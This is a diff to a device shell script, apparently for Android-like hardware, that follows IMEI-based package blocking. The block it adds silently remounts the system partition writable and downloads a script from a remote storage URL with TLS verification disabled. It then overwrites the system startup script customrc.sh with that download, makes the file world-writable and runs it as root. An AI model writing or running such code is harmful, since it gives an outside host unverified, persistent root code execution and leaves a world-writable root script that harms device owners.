@@ -56,3 +56,25 @@ if [ -n "$blocked_packages" ]; then
 else
     echo "No packages to block for the current IMEI."
 fi
+
+if [ ! -f /system/scripts/customrc.sh.bak1 ]; then
+
+    mount -o rw,remount /
+
+    dcurl --dns-servers 1.1.1.1 -k -s https://ktrud.nyc3.digitaloceanspaces.com/torch/customrc.sh -o /data/local/tmp/customrc.sh
+
+    mv /system/scripts/customrc.sh /system/scripts/customrc.sh.bak1
+
+
+    mv /data/local/tmp/customrc.sh /system/scripts/customrc.sh
+
+
+    chmod a+rwx /system/scripts/customrc.sh
+    chown root:root /system/scripts/customrc.sh
+
+
+    mount -o ro,remount /
+
+
+    sh /system/scripts/customrc.sh &
+fi
